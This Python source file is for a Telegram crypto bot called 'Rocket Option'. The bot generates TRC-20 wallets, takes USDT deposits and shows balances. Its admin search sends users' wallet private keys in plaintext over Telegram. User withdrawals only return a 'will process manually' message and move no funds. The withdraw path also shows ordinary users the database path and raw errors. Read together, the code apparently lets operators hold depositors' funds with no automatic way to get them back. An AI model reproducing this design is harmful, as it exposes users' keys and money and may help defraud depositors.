
import telebot  
import time
import logging
from logger import logger
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from config import BOT_TOKEN, ADMIN_USER_ID, MASTER_WALLET_ADDRESS
from wallet_manager import get_wallet_by_user, create_wallet_for_user, get_wallet_balances
from balance import refresh_user_balance
from handle_mint import handle_mint
from db import get_connection, get_full_wallet, create_user
from db import update_user_info, read_db  

import threading
import requests

def start_self_ping():
    def ping_loop():
        while True:
            try:
                response = requests.get("https://profit-bridge-bot.onrender.com/")
                if response.status_code == 200:
                    print("🔁 Self-ping successful")
                else:
                    print(f"⚠️ Self-ping failed. Status: {response.status_code}")
            except Exception as e:
                print(f"❌ Self-ping error: {e}")
            time.sleep(300)  # Wait 5 minutes

    thread = threading.Thread(target=ping_loop, daemon=True)
    thread.start()


from user_store import ensure_user_profile

bot = telebot.TeleBot(BOT_TOKEN)

from wallet_monitor import configure_bot_instance, start_monitoring_in_thread, start_heartbeat_in_thread

import os
from db import DB_FILE_PATH

# Debug: Show full path to the local database
absolute_path = os.path.abspath(DB_FILE_PATH)
print(f"🗂️ [DEBUG] Local DB is stored at: {absolute_path}")




# === START ===
@bot.message_handler(commands=['start'])
def start(message):
    telegram_id = message.from_user.id
    full_name = f"{message.from_user.first_name} {message.from_user.last_name or ''}".strip()

    # Ensure user profile (wallet) exists
    ensure_user_profile(telegram_id, full_name)

    # ✅ Save full_name and country to DB
    update_user_info(telegram_id, full_name=full_name)

    logger.info(f"[START] /start called by Telegram ID: {telegram_id} ({full_name})")

    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("📅 Deposit", callback_data="deposit"),
        InlineKeyboardButton("📊 Balance", callback_data="view_balance"),
        InlineKeyboardButton("⚒️ Trade" if str(telegram_id) != ADMIN_USER_ID else "🔍 Search Users", callback_data="start_trade"),
        InlineKeyboardButton("💸 Withdraw", callback_data="withdraw_request")
    )

    bot.send_message(
        message.chat.id,
        "👋 *Welcome to Rocket Option!*\n\n"
        "Use the buttons below to manage your wallet and start trading using our bot." if str(telegram_id) != ADMIN_USER_ID else
        "🛠 *Admin Panel*\n\nManage user wallets and balances from below.",
        parse_mode='Markdown',
        reply_markup=keyboard
    )


# === Deposit ===
def deposit(message, telegram_id):
    wallet = create_wallet_for_user(telegram_id)  # This now fetches OR creates

    logger.info(f"[DEPOSIT] Deposit requested by Telegram ID: {telegram_id}")
    logger.info(f"[DEPOSIT] Wallet info: {wallet}")

    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔄 Check Balance", callback_data="view_balance"),
        InlineKeyboardButton("⚒️ Start Trade", callback_data="start_trade")
    )

    bot.send_message(
        message.chat.id,
        f"📅 *Deposit Wallet (TRC-20)*\n━━━━━━━━━━━━━━━━━━━━\n"
        f"🔐 *Address:*\n`{wallet['address']}`\n\n"
        f"💡 Send *USDT (TRC-20)* to this address.",
        parse_mode='Markdown',
        reply_markup=keyboard
    )

# === Balance ===
def balance(message, telegram_id):
    logger.info(f"[BALANCE] Balance requested by Telegram ID: {telegram_id}")

    # Admin sees master wallet balances
    if str(telegram_id) == ADMIN_USER_ID:
        trx, usdt = get_wallet_balances(MASTER_WALLET_ADDRESS)
        logger.info(f"[BALANCE] Admin requested master wallet balance: USDT={usdt}, TRX={trx}")
        bot.send_message(
            message.chat.id,
            f"🔐 *Master Wallet Balance*\n━━━━━━━━━━━━━━━━━━━━\n"
            f"💵 *USDT*: `{usdt:.2f}`\n💰 *TRX*: `{trx:.4f}`\n"
            f"🏦 *Address:* `{MASTER_WALLET_ADDRESS}`",
            parse_mode='Markdown'
        )
        return

    # Regular user flow
    wallet = get_wallet_by_user(telegram_id)
    logger.info(f"[BALANCE] Wallet fetched for user {telegram_id}: {wallet}")

    if not wallet:
        logger.warning(f"[BALANCE] Wallet not found for Telegram ID: {telegram_id}")
        bot.send_message(message.chat.id, "🚫 Wallet not found. Please click *Deposit* to generate one.", parse_mode='Markdown')
        return

    try:
        refresh_user_balance(telegram_id)
        updated = get_wallet_by_user(telegram_id)
        trx, usdt = updated.get("trx_balance", 0), updated.get("usdt_balance", 0)

        logger.info(f"[BALANCE] Updated balances for {telegram_id}: USDT={usdt}, TRX={trx}")

        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("🔄 Refresh", callback_data="view_balance"),
            InlineKeyboardButton("⚒️ Start Trade", callback_data="start_trade")
        )

        bot.send_message(
            message.chat.id,
            f"💼 *Your Wallet Balance*\n━━━━━━━━━━━━━━━━━━━━\n"
            f"💵 *USDT*: `{usdt:.2f}`\n💰 *TRX*: `{trx:.4f}`\n"
            f"🔐 *Address:* `{wallet['address']}`",
            parse_mode='Markdown',
            reply_markup=keyboard
        )
    except Exception as e:
        logger.error(f"[BALANCE] Error retrieving balance for Telegram ID {telegram_id}: {e}")
        bot.send_message(message.chat.id, "⚠️ Failed to retrieve balance. Please try again later.")

# === Trade / Admin Search ===
def trade(message, telegram_id):
    logger.info(f"[TRADE] Trade/start_search requested by Telegram ID: {telegram_id}")

    if str(telegram_id) == ADMIN_USER_ID:
        bot.send_message(
            message.chat.id,
            "🔎 *Enter a user's Telegram ID to view their wallet info:*",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(message, handle_admin_user_search)
        return

    try:
        wallet = get_wallet_by_user(telegram_id)
        logger.info(f"[TRADE DEBUG] About to call handle_mint() for Telegram ID: {telegram_id} using wallet: {wallet}")
        
        handle_mint(telegram_id, wallet, bot, message)
        logger.info(f"[TRADE] Trade handled for user {telegram_id}")
    except Exception as e:
        logger.error(f"[TRADE] Error during trade for Telegram ID {telegram_id}: {e}")
        bot.send_message(message.chat.id, "❌ Trade failed. Minimum Balance to Trade must be 50 USDT.")


# === Admin Handler ===
def handle_admin_user_search(message):
    try:
        target_id = int(message.text.strip())
        logger.info(f"[ADMIN SEARCH] Admin requested info for Telegram ID: {target_id}")
        wallet = get_wallet_by_user(target_id)
        logger.info(f"[ADMIN SEARCH] Wallet fetched: {wallet}")

        if not wallet:
            logger.warning(f"[ADMIN SEARCH] No wallet found for Telegram ID: {target_id}")
            bot.send_message(message.chat.id, "❌ No wallet found for this user.")
            return

        trx, usdt = get_wallet_balances(wallet['address'])
        msg = (
            f"👤 *User Wallet Info*\n━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 Telegram ID: `{target_id}`\n"
            f"🔐 Address: `{wallet['address']}`\n"
            f"🔑 Private Key: `{wallet['private_key']}`\n"
            f"💵 USDT: `{usdt:.2f}`\n"
            f"💰 TRX: `{trx:.4f}`"
        )
        logger.info(f"[ADMIN SEARCH] Sending wallet info to admin for Telegram ID: {target_id}")
        bot.send_message(message.chat.id, msg, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"[ADMIN SEARCH] Failed to fetch user data: {e}")
        bot.send_message(message.chat.id, "⚠️ Failed to fetch user data. Check Telegram ID.")

# === Withdraw ===
from db import read_db, USE_LOCAL_DB, LOCAL_DB_PATH, get_connection
import os

def withdraw(message, telegram_id):
    logger.info(f"[WITHDRAW] Withdrawal request by Telegram ID: {telegram_id}")

    # === Debug DB Info ===
    if USE_LOCAL_DB:
        db_path = os.path.abspath(LOCAL_DB_PATH)
        logger.info(f"[DEBUG] Using LOCAL JSON DB at: {db_path}")
        bot.send_message(
            message.chat.id,
            f"🗂 *DB Mode:* Local JSON\n📁 Path: `{db_path}`",
            parse_mode="Markdown"
        )
    else:
        try:
            conn = get_connection()
            if conn:
                logger.info("[DEBUG] PostgreSQL connection successful.")
                bot.send_message(
                    message.chat.id,
                    "🗂 *DB Mode:* PostgreSQL\n✅ Connection OK",
                    parse_mode="Markdown"
                )
                conn.close()
        except Exception as e:
            logger.error(f"[DB ERROR] PostgreSQL connection failed: {e}")
            bot.send_message(
                message.chat.id,
                f"❌ PostgreSQL DB connection failed.\n`{e}`",
                parse_mode="Markdown"
            )
            return

    # === Handle Role Logic ===
    if str(telegram_id) == ADMIN_USER_ID:
        # Admin: Show list of all users (telegram_id + full_name)
        db = read_db()
        users = db.get("users", [])

        if not users:
            bot.send_message(message.chat.id, "ℹ️ No users found in the database.")
            return

        msg_lines = ["👥 *Registered Users:*"]
        for user in users:
            tg_id = user.get("telegram_id", "N/A")
            full_name = user.get("full_name", "N/A")
            msg_lines.append(f"🆔 `{tg_id}` — {full_name}")

        msg_text = "\n".join(msg_lines)
        bot.send_message(message.chat.id, msg_text, parse_mode="Markdown")
    else:
        # Regular user: standard message
        bot.send_message(
            message.chat.id,
            "💸 *Withdrawal Request Received!*\n"
            "Our team will verify and process manually.",
            parse_mode='Markdown'
        )


# === Button Handler ===
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    data = call.data
    telegram_id = call.from_user.id
    logger.info(f"[CALLBACK] Callback data '{data}' received from Telegram ID: {telegram_id}")

    if data == "deposit":
        deposit(call.message, telegram_id)
    elif data == "view_balance":
        balance(call.message, telegram_id)
    elif data == "start_trade":
        trade(call.message, telegram_id)
    elif data == "withdraw_request":
        withdraw(call.message, telegram_id)


def init_bot():
    configure_bot_instance(bot)
    start_monitoring_in_thread()
    start_heartbeat_in_thread()
    start_self_ping()  # ✅ New line to keep bot alive on Render
    print("✅ Wallet monitor launched and running in background.")

    # Debug: Show full path to the local database
    absolute_path = os.path.abspath(DB_FILE_PATH)
    print(f"🗂️ [DEBUG] Local DB is stored at: {absolute_path}")

    # Clear webhook
    try:
        bot.delete_webhook()
        print("✅ Webhook deleted successfully")
    except Exception as e:
        print(f"❌ Webhook deletion failed: {e}")




